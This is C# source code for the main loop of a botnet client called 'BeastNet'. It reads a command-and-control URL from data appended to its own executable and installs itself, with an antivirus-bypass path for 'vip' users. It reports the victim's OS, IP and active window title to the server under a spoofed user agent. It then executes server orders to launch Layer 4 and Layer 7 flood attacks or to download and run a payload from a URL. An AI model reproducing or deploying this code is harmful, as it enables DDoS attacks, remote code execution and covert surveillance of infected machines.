using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Text;
using System.IO;
using System.Threading;

namespace BeastNet
{
    internal class Program
    {
        static string GetFromURL(string url)
        {
            try
            {
                WebClient client = new WebClient();
                return client.DownloadString(url);
            }
            catch
            {
                return "";
            }
        }

        private static void Main()
        {
            string stubSetting;
            using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
            {
                using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
                {
                    byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
                    stubSetting = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("&&&&&")).Replace("&&&&&", "");
                }
            }

            string url = stubSetting.Split('|')[0];
            string username = stubSetting.Split('|')[1];
            string startup = stubSetting.Split('|')[2];

            string status = GetFromURL(url + "/status/" + username);
            string interval;
            int intervalInt;

            if (startup.Equals("use"))
            {
                if (status.Equals("vip")) 
                {
                    Installer.InstallAVBypass();
                }
                else
                {
                    Installer.Install();
                }
            }
            
            string os = GetInfo.GetOSVersion();
            string ip = GetInfo.GetIP();
            string currentWindow;
            
            while (true)
            {
                try
                {
                    currentWindow = GetInfo.GetActiveWindowTitle();
                    var request = (HttpWebRequest)WebRequest.Create(url + "/docking");

                    var postData = "username=" + username;
                    postData += "&os=" + os;
                    postData += "&ip=" + ip;
                    postData += "&currentTask=" + currentWindow;
                    var data = Encoding.ASCII.GetBytes(postData);

                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.UserAgent = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+";
                    request.ContentLength = data.Length;

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }
                    var response = (HttpWebResponse)request.GetResponse();
                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    Console.WriteLine(responseString);
                    ParseString(responseString);
                    interval = GetFromURL(url + "/interval/" + username);
                    intervalInt = Convert.ToInt32(interval);
                    Thread.Sleep((intervalInt - 1) * 1000);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }
        }

        static void ParseString(string str)
        {
            Console.WriteLine(str);
            if (str.Contains("*"))
            {
                string[] splited = str.Split('*');
                foreach (string temp in splited)
                {
                    if (str.Length - str.Replace(";", "").Length == 2 && str.Length - str.Replace("|", "").Length == 2)
                    {
                        int taskType = Convert.ToInt32(temp.Split('|')[1]);
                        string param = temp.Split('|')[2];
                        string[] parsed = param.Split(';');
                        string address = parsed[0];
                        int thread = Convert.ToInt32(parsed[1]);
                        int time = Convert.ToInt32(parsed[2]);
                        switch (taskType)
                        {
                            case 5:
                                string ip = address.Split(':')[0];
                                int port = Convert.ToInt32(address.Split(':')[1]);
                                Layer4.AttackL4(ip, port, thread, time, 10, 0);
                                break;
                            case 7:
                                Layer7.AttackL7(address, thread, time, 10, 0);
                                break;
                            case 8:
                                Layer7.AttackL7(address, thread, time, 10, 1);
                                break;
                            case 9:
                                Layer7.AttackL7(address, thread, time, 10, 4);
                                break;
                            case 10:
                                Layer7.AttackL7(address, thread, time, 10, 2);
                                break;
                            case 11:
                                Layer7.AttackL7(address, thread, time, 10, 3);
                                break;
                        }
                    }
                    else if (str.Length - str.Replace(";", "").Length == 0 && str.Length - str.Replace("|", "").Length == 2)
                    {
                        int taskType = Convert.ToInt32(temp.Split('|')[1]);
                        string url = temp.Split('|')[2];
                        Execute.ExecRun(url, taskType);
                    }
                }
            }
            else 
            {
                if (str.Length - str.Replace(";", "").Length == 2 && str.Length - str.Replace("|", "").Length == 2)
                {
                    int taskType = Convert.ToInt32(str.Split('|')[1]);
                    string param = str.Split('|')[2];
                    string[] parsed = param.Split(';');
                    string address = parsed[0];
                    int thread = Convert.ToInt32(parsed[1]);
                    int time = Convert.ToInt32(parsed[2]);
                    switch (taskType)
                    {
                        case 5:
                            string ip = address.Split(':')[0];
                            int port = Convert.ToInt32(address.Split(':')[1]);
                            Layer4.AttackL4(ip, port, thread, time, 10, 0);
                            break;
                        case 7:
                            Layer7.AttackL7(address, thread, time, 10, 0);
                            break;
                        case 8:
                            Layer7.AttackL7(address, thread, time, 10, 1);
                            break;
                        case 9:
                            Layer7.AttackL7(address, thread, time, 10, 4);
                            break;
                        case 10:
                            Layer7.AttackL7(address, thread, time, 10, 2);
                            break;
                        case 11:
                            Layer7.AttackL7(address, thread, time, 10, 3);
                            break;
                    }
                }
                else if (str.Length - str.Replace(";", "").Length == 0 && str.Length - str.Replace("|", "").Length == 2)
                {
                    int taskType = Convert.ToInt32(str.Split('|')[1]);
                    string url = str.Split('|')[2];
                    Execute.ExecRun(url, taskType);
                }
            }
        }
    }
}